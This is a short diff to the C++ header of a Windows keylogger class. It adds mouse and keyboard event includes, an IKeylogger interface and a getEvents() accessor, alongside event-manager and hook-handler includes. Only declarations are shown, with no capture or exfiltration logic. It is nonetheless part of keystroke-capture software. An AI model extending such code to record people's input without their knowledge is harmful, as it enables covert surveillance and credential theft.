@@ -9,11 +9,13 @@
 #include <Windows.h>
 #include <iostream>
 
-#include "AEvent.h"
+#include "MouseEvent.h"
+#include "KeyboardEvent.h"
 #include "EventManager.h"
 #include "HookHandler.h"
+#include "IKeylogger.h"
 
-class Keylogger {
+class Keylogger : public IKeylogger {
 public:
     Keylogger();
 	~Keylogger();
@@ -22,6 +24,7 @@ public:
     bool				stop();
     bool				kill();
 	bool				pushToQueue(const AEvent*);
+	std::vector<AEvent*> getEvents() const;
 
 private: 
 	bool				_running;
